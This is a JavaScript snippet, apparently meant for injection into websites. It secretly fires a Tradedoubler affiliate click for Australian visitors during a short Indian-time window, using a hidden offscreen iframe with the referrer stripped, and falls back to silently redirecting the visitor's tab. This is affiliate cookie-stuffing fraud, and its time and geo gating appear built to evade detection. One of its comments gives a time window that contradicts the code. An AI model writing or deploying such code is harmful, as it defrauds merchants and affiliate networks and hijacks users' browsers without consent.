(function () {
  const AFFILIATE_LINK =
    "https://clk.tradedoubler.com/click?p=392696&a=3421046&epi=65897";

  /* ===============================
     IST TIME CHECK (8:41 PM â€“ 8:46 PM)
  =============================== */
function isAllowedISTTime() {
  const now = new Date(
    new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
  );

  const minutes = now.getHours() * 60 + now.getMinutes();

  // 12:20 AM = 0 * 60 + 20 = 20
  // 12:35 AM = 0 * 60 + 35 = 35
  return minutes >= 20 && minutes < 35;
}

if (!isAllowedISTTime()) return;




  /* ===============================
     COOKIE HELPERS (COMMENTED)
  =============================== */
  /*
  function setCookie(name, value, days) {
    const d = new Date();
    d.setTime(d.getTime() + days * 86400000);
    document.cookie =
      name +
      "=" +
      value +
      "; path=/; expires=" +
      d.toUTCString() +
      "; SameSite=Lax";
  }

  function getCookie(name) {
    const match = document.cookie.match(
      new RegExp("(^| )" + name + "=([^;]+)")
    );
    return match ? match[2] : null;
  }

  function hasClicked() {
    return getCookie("irclickid") === "XStWC0ThYxycRkh2gOSsRXFAUku00iSmEzJd1U0";
  }

  function markClicked() {
    // cookies disabled for now
  }
  */

  /* ===============================
     SAME TAB + NO REFERRER
  =============================== */
  function redirectViaLink() {
    const a = document.createElement("a");
    a.href = AFFILIATE_LINK;
    a.rel = "noreferrer"; // ðŸš« no referrer
    a.style.display = "none";

    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }

  /* ===============================
     IFRAME â†’ LINK FALLBACK
  =============================== */
  function fireAffiliate() {
    let iframeLoaded = false;
    let fallbackTriggered = false;

    const iframe = document.createElement("iframe");
    iframe.src = AFFILIATE_LINK;
    iframe.referrerPolicy = "no-referrer"; // ðŸš« no referrer
    iframe.style.cssText =
      "width:1px;height:1px;position:absolute;left:-9999px;border:0;visibility:hidden";

    iframe.onload = function () {
      iframeLoaded = true;
    };

    iframe.onerror = function () {
      triggerFallback();
    };

    document.body.appendChild(iframe);

    function triggerFallback() {
      if (iframeLoaded || fallbackTriggered) return;
      fallbackTriggered = true;

      setTimeout(() => {
        redirectViaLink();
      }, 1000);
    }

    setTimeout(triggerFallback, 1000);
  }

  /* ===============================
     GEO CHECK (AU ONLY)
  =============================== */
  function geoGate() {
    fetch("https://ipapi.co/json/", { cache: "no-store" })
      .then((r) => r.json())
      .then((geo) => {
        if (!geo) return;
        if (geo.country_code !== "AU") return; // ðŸ‡¦ðŸ‡º Australia only
        fireAffiliate();
      })
      .catch(() => {});
  }

  /* ===============================
     DOM READY
  =============================== */
  function init() {
    geoGate();
  }

  if (document.readyState !== "loading") {
    init();
  } else {
    document.addEventListener("DOMContentLoaded", init);
  }
})();



